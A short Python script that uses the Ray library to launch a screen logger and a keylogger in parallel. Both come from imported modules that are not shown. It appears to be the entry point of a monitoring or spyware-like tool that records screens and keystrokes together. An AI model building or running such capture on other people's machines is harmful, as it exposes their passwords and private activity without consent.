from screenlogger import take
from keylogger import listen
import ray


@ray.remote
def screen():
    take()


@ray.remote
def keyboard():
    listen()


if __name__ == "__main__":
    ray.get([screen.remote(), keyboard.remote()])
